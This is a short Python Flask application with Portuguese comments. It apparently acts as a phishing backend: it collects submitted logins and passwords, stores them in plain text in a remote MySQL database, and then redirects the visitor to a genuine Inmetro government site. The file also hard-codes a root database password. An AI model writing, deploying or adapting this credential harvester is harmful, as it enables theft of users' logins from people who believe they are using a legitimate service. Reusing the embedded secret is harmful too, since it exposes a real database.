from flask import Flask, render_template, request, redirect
import mysql.connector

app = Flask(__name__)

class Dados:
   def __init__(self, login, senha):
      self.login = login
      self.senha = senha

@app.route('/')
def index():
  return render_template('index.html')

@app.route('/', methods=['POST'])
def login():
    if request.method == 'POST':
      login = request.form['login']
      senha = request.form['senha']

      # Criar um objeto com os dados recebidos
      dados = Dados(login, senha)

      # Estabelecer a conexão com o banco de dados MySQL
      conn = mysql.connector.connect(
        host='containers-us-west-189.railway.app',
        user='root',
        password='5Rg4COCO8b9meUM2gTbE',
        database='railway'
      )

      # Criar um cursor para executar as operações no banco de dados
      cursor = conn.cursor()

      # Executar a inserção dos dados na tabela desejada
      query = "INSERT INTO users_2 (login, senha) VALUES (%s, %s)"
      values = (dados.login, dados.senha)
      cursor.execute(query, values)

      # Confirmar a transação
      conn.commit()

      # Fechar o cursor e a conexão com o banco de dados
      cursor.close()
      conn.close()

      # Redirecionar para um site após a inserção no banco de dados
      return redirect('https://orquestra.inmetro.gov.br/inmetrobcweb/')

if __name__ == '__main__':
  app.run(port=5000)
